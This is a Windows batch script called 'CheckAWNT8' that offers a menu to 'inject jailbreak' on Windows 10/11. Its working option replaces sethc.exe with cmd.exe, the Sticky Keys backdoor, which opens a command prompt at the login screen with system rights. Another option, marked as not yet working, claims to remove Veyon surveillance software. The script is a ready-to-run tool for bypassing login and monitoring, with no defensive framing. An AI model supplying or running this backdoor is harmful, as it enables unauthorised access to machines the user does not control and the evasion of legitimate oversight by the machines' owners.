@echo off
echo ----CheckAWNT8-------------------------------
echo Welcome to CheckAWNT8! (Windows 10/11)
echo This will allow you to run the Sticky Keys Exploit
echo (You take full responsibility for the jailbreak)
echo 1: Inject jailbreak
echo 2: Remove Veyon Surveillance (doesn't work yet)
echo 3: Restart
echo 4: Exit
echo 5: Inject jailbreak (Utilman method) (doesn't work yet)
set /p choice=Enter an option:

if "%choice%"=="1" goto 1
if "%choice%"=="2" goto 2
if "%choice%"=="3" goto 3
if "%choice%"=="4" goto 4
if "%choice%"=="5" goto 5

echo Error: Invalid input
goto End

:1
ren C:\Windows\System32\sethc.exe etc.exe.bak
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
echo The Sticky Keys Exploit has been injected successfully!
goto End

:2
echo This option doesn't work yet!    
goto End

:3
shutdown -r -t 0
goto End

:4
goto End

:5
echo Error: Invalid input
goto End

:End
pause
